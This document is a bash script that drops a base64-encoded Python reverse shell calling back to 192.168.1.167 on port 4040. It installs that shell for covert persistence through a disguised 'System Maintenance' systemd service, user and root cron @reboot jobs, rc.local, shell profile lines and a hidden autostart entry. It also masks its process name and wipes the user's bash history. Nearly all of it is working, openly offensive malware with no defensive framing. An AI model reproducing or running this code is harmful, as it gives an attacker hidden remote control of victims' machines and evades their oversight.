#!/bin/bash

# Setup environment
set -e
trap 'rm -rf "$TMPDIR"' EXIT
TMPDIR=$(mktemp -d)
cd "$TMPDIR"

# Create payload
cat > payload.py <<'EOF'
import socket,subprocess,os,base64
def main():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.1.167", 4040))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
    except Exception:
        pass
if __name__ == "__main__":
    main()
EOF

# Encrypt payload
PAYLOAD_ENC=$(base64 payload.py)

# Create persist.sh
cat > persist.sh <<EOF
#!/bin/bash
# Hide process name
echo -ne "\x01\x34" > /proc/self/comm

# Check if running
if [ -z "\$(pgrep -f 'persist.sh')" ]; then
    # Not running, execute payload
    echo "$PAYLOAD_ENC" | base64 -d | python3
fi

# Self-preservation
mkdir -p ~/.cache/.hidden
cp "\$0" ~/.cache/.hidden/persist.sh
chmod +x ~/.cache/.hidden/persist.sh

# Persistence mechanisms
{
    # Systemd service
    cat > /etc/systemd/system/.hidden.service <<SERVICE
[Unit]
Description=System Maintenance
After=network.target

[Service]
Type=simple
ExecStart=~/.cache/.hidden/persist.sh
Restart=always

[Install]
WantedBy=multi-user.target
SERVICE
    systemctl enable .hidden.service
    systemctl start .hidden.service
    
    # Cron jobs
    (crontab -l 2>/dev/null; echo "@reboot ~/.cache/.hidden/persist.sh") | crontab -
    (crontab -u root -l 2>/dev/null; echo "@reboot ~/.cache/.hidden/persist.sh") | crontab -u root -
    
    # RC local
    echo "~/.cache/.hidden/persist.sh" >> /etc/rc.local
    
    # User profiles
    echo "~/.cache/.hidden/persist.sh" >> ~/.profile
    echo "~/.cache/.hidden/persist.sh" >> ~/.bashrc
    
    # Hidden autostart
    mkdir -p ~/.config/autostart/
    cat > ~/.config/autostart/.hidden.desktop <<DESKTOP
[Desktop Entry]
Type=Application
Name=System Maintenance
Exec=~/.cache/.hidden/persist.sh
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
DESKTOP
} &>/dev/null

# Cleanup
rm -rf ~/.bash_history
history -c
EOF

chmod +x persist.sh
./persist.sh
rm -rf "$TMPDIR"
